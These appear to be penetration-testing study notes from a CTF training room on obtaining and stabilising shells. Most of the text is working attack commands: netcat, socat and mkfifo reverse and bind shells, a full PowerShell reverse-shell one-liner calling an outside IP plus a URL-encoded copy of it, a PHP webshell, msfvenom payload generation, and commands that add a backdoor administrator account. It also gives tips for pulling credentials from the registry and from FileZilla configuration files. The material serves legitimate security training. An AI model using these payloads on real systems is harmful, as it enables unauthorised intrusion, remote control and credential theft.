# Getting a shell

## Interactive/Non-interactive shells

* _Interactive:_ If you've used Powershell, Bash, Zsh, sh, or any other standard CLI environment then you will be used to\
  interactive shells. These allow you to interact with programs after executing them. For example, take the SSH login prompt:

![](https://i.imgur.com/0ayLj8L.png)

* Here you can see that it's asking _interactively_ that the user type either yes or no in order to continue the connection. This is an interactive program, which requires an interactive shell in order to run.



* _Non-Interactive_ shells don't give you that luxury. In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly. Unfortunately, the majority of simple reverse and bind shells are non-interactive, which can make further exploitation trickier. Let's see what happens when we try to run SSH in a non-interactive shell:\
  \
  Notice that the `whoami` command (which is non-interactive) executes perfectly, but the `ssh` command (which _is_ interactive) gives us no output at all. As an interesting side note, the output of an interactive command _does_ go somewhere, however, figuring out **where** is an exercise for you to attempt on your own. Suffice to say that interactive programs do not work in non-interactive shells.

Additionally, in various places throughout this task you will see a command in the screenshots called `listener`. This command is an alias unique to the attacking machine used for demonstrations, and is a shorthand way of typing `sudo rlwrap nc -lvnp 443`, which will be covered in upcoming tasks. It will _not_ work on any other machine unless the alias has been configured locally.

## Netcat



### Reverse shell

Windows version included with Kali is at /usr/share/windows-resources/binaries

On the attacking machine:

`sudo nc -nvlp 443`

* **-l** is used to tell netcat that this will be a listener
* **-v** is used to request a verbose output
* **-n** tells netcat not to resolve host names or use DNS. Explaining this is outwith the scope of the room.
* **-p** indicates that the port specification will follow.

Be aware that if you choose to use a port below 1024, you will need to use `sudo` when starting your listener. That said, it's often a good idea to use a well-known port number (80, 443 or 53 being good choices) as this is more likely to get past outbound firewall rules on the target.

On the target:

`nc <local-IP> <port> -e /bin/bash`

### Bind Shell

On the attacking machine:

`nc -nvlp <port> -e "cmd.exe"`



On the target:

`nc Machine_IP <port>`



### Netcat Shell Stabilisation

#### Technique 1: Python

The first technique we'll be discussing is applicable only to Linux boxes, as they will nearly always have Python installed by default. This is a three stage process:

1.

```
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

1. note that some targets may need the version of Python specified. If this is the case, replace `python` with `python2` or `python3` as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
2. Step two is: `export TERM=xterm` -- this will give us access to term commands such as `clear`.
3. Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.



The full technique can be seen here:

![](https://i.imgur.com/bQnFz1T.png)

Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type `reset` and press enter.

#### Technique 2: rlwrap

rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell_;_ however, s_ome_ manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with `sudo apt install rlwrap`.

To use rlwrap, we invoke a slightly different listener:

`rlwrap nc -lvnp <port>`\


Prepending our netcat listener with "rlwrap" gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use `stty raw -echo; fg` to stabilise and re-enter the shell.

#### Technique 3: Socat

The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86\_64/socat?raw=true) (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (`wget <LOCAL-IP>/socat -O /tmp/socat`).

For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`). We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks.

***

With any of the above techniques, it's useful to be able to change your terminal tty size. This is something that your terminal will do automatically when using a regular shell; however, it must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.

First, open another terminal and run `stty -a`. This will give you a large stream of output. Note down the values for "rows" and columns:

![](https://i.imgur.com/7aOKtlO.png)

Next, in your reverse/bind shell, type in:

`stty rows <number>`\


and

`stty cols <number>`\


Filling in the numbers you got from running the command in your own terminal.

This will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.

## Socat

### Reverse shell

`socat TCP-L: -`

On Windows we would use this command to connect back:

`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`

This is the equivalent command for a Linux Target:

`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`

### Bind shells

On a Linux target we would use the following command:

`socat TCP-L:<PORT> EXEC:"bash -li"`\


On a Windows target we would use this command for our listener:

`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`\


We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.\


Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.

`socat TCP:<TARGET-IP>:<TARGET-PORT> -`

### `A` fully stable Linux tty reverse shell

Now let's take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell. This will only work when the target is Linux, but is _significantly_ more stable. As mentioned earlier, socat is an incredibly versatile tool; however, the following technique is perhaps one of its most useful applications. Here is the new listener syntax:\


``socat TCP-L:<port> FILE:`tty`,raw,echo=0``\


Let's break this command down into its two parts. As usual, we're connecting two points together. In this case those points are a listening port, and a file. Specifically, we are passing in the current TTY as a file and setting the echo to be zero. This is approximately equivalent to using the Ctrl + Z, `stty raw -echo; fg` trick with a netcat shell -- with the added bonus of being immediately stable and hooking into a full tty.

The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, however, it's possible to upload a [precompiled socat binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86\_64/socat?raw=true), which can then be executed as normal.

The special command is as follows:

`socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`\


This is a handful, so let's break it down.

The first part is easy -- we're linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with  `EXEC:"bash -li"`. We're also passing the arguments: pty, stderr, sigint, setsid and sane:

* **pty**, allocates a pseudoterminal on the target -- part of the stabilisation process
* **stderr**, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)\

* **sigint**, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
* **setsid**, creates the process in a new session
* **sane**, stabilises the terminal, attempting to "normalise" it.

That's a lot to take in, so let's see it in action.

As normal, on the left we have a listener running on our local attacking machine, on the right we have a simulation of a compromised target, running with a non-interactive shell. Using the non-interactive netcat shell, we execute the special socat command, and receive a fully interactive bash shell on the socat listener to the left:

![](https://i.imgur.com/etAuYzz.png)

Note that the socat shell is fully interactive, allowing us to use interactive commands such as SSH. This can then be further improved by setting the stty values as seen in the previous task, which will let us use text editors such as Vim or Nano.

***

If, at any point, a socat shell is not working correctly, it's well worth increasing the verbosity by adding `-d -d` into the command. This is very useful for experimental purposes, but is not usually necessary for general use.

### Socat Encrypted Shells

We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:

`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`\
This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.\
We then need to merge the two created files into a single `.pem` file:\
`cat shell.key shell.crt > shell.pem`\
\
Now, when we set up our reverse shell listener, we use:\
`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`\
\
This sets up an OPENSSL listener using our generated certificate. `verify=0` tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate _must_ be used on whichever device is listening.\
\
To connect back, we would use:\
`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`\
\
The same technique would apply for a bind shell:\
Target:\
`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`\
\
Attacker:\
`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`\
\
Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.\
The following image shows an OPENSSL Reverse shell from a Linux target. As usual, the target is on the right, and the attacker is on the left:

\
This technique will also work with the special, Linux-only TTY shell covered in the previous task -- figuring out the syntax for this will be the challenge for this task. Feel free to use the Linux Practice box (deployable at the end of the room) to experiment if you're struggling to obtain the answer.\

### `Common shell payloads`

On Linux, however, we would instead use this code to create a listener for a bind shell:

`mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`



> _The command first creates a_ [_named pipe_](https://www.linuxjournal.com/article/2156) _at `/tmp/f`. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into `sh`, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle._

\


![](https://i.imgur.com/se5Fyn3.png)

A very similar command can be used to send a netcat reverse shell:

`mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`\


This command is virtually identical to the previous one, other than using the netcat connect syntax, as opposed to the netcat listen syntax.

![](https://i.imgur.com/Xf0hA5p.png)

When targeting a modern Windows Server, it is very common to require a Powershell reverse shell, so we'll be covering the standard one-liner PSH reverse shell here.\


powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.13',4443);$stream = $client.GetStream();\[byte\[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = (\[text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"\


In order to use this, we need to replace "\<IP>" and "\<port>" with an appropriate IP and choice of port. It can then be copied into a cmd.exe shell (or another method of executing commands on a Windows server, such as a webshell) and executed, resulting in a reverse shell:

![](https://i.imgur.com/T6o7kOL.png)

## rlwrap

```
rlwrap nc -nvlp 4444
```



## Metasploit - multi/handler

Multi/Handler is a superb tool for catching reverse shells. It's essential if you want to use Meterpreter shells, and is the go-to when using staged payloads.

1. Open Metasploit with `msfconsole`
2. Type `use multi/handler`, and press enter

`exploit -j` ### to run the exploit in the background

## Msfvenom - generate payloads on the fly



Standard syntax&#x20;

`msfvenom -p`` `_`<Payload> <Options>`_

_Windows x64 Reverse Shell example_

`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=`_`<listen-ip>`_` ``LPORT=<listen-port>`

### Staged vs Stageless

* _**Staged**_ payloads are sent in two parts. The first part is called the _stager_. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.\

* _**Stageless**_ payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.

Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discover and remove. Staged payloads are harder to use, but the initial stager is a lot shorter, and is sometimes missed by less-effective antivirus software. Modern day antivirus solutions will also make use of the Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager, making staged payloads less effective than they would once have been in this area.

### Payload Naming Conventions

The basic convention is as follows:

`<OS>/<arch>/<payload>`\
\
For example:

`linux/x86/shell_reverse_tcp`

This would generate a stageless reverse shell for an x86 Linux target.

The exception to this convention is Windows 32bit targets. For these, the arch is not specified. e.g.:

`windows/shell_reverse_tcp`

For a 64bit Windows target, the arch would be specified as normal (x64).

In the above examples the payload used was `shell_reverse_tcp`. This indicates that it was a _stageless_ payload. How? Stageless payloads are denoted with underscores (`_`). The staged equivalent to this payload would be:

`shell/reverse_tcp`\


As staged payloads are denoted with another forward slash (`/`).

This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this:

`windows/x64/meterpreter/reverse_tcp`\


A Linux 32bit stageless Meterpreter payload would look like this:

`linux/x86/meterpreter_reverse_tcp`

List pa**yloads**

`msfvenom --list payloads | grep "linux/x86/meterpreter"`

## Webshells

A very basic PHP script to be uploaded

`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`

Webshells pre-installed in Kali located at /usr/share/webshells

[PentestMonkey php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) a full reverse shell written in PHP

When the target is Windows, it is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell in the language of the server. With the former method, obtaining RCE is often done with a URL Encoded Powershell Reverse Shell. This would be copied into the URL as the `cmd` argument:

`powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22`

This is the same shell we encountered in Task 8, however, it has been URL encoded to be used safely in a GET parameter.



## Next Steps

We've covered lots of ways to generate, send and receive shells. The one thing that these all have in common is that they tend to be unstable and non-interactive. Even Unix style shells which are easier to stabilise are not ideal. So, what can we do about this?

On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at `/home/<user>/.ssh` are often an ideal way to do this. In CTFs it's also not infrequent to find credentials lying around somewhere on the box. Some exploits will also allow you to add your own account. In particular something like [Dirty C0w](https://dirtycow.ninja/) or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.

On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at `C:\Program Files\FileZilla Server\FileZilla Server.xml`\
&#x20;or `C:\xampp\FileZilla Server\FileZilla Server.xml`\
. These can be MD5 hashes or in plaintext, depending on the version.

Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.

The syntax for this is as follows:

`net user <username> <password> /add`

`net localgroup administrators <username> /add`
